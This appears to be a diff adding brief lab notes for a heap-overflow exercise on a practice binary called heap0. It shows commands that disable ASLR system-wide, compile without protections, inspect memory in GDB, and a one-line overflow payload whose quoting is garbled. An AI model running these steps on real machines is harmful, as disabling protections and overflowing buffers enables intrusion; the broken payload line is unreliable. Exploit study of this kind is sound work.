@@ -1,0 +1,8 @@
+sudo sysctl -w kernel.randomize_va_space=0 //  unactivate ASLR(Address Space Randomization)
+gcc -z execstack -w -no-pie -o heap0 heap0.c // -no-pie option not to make a position independent executable(PIE)
+x/80xw 0x4052a0 
+In GDB, ‘x/80xw’ means
+x = checking memory | 80 = amount of values
+x = in hexadecimal | w = unit is 4 byte (word)
+4*4*5 = 80 byte of trash value 
+./heap0 $(python -c “print ‘F * 80 + ‘\x52\x11\x40’”)
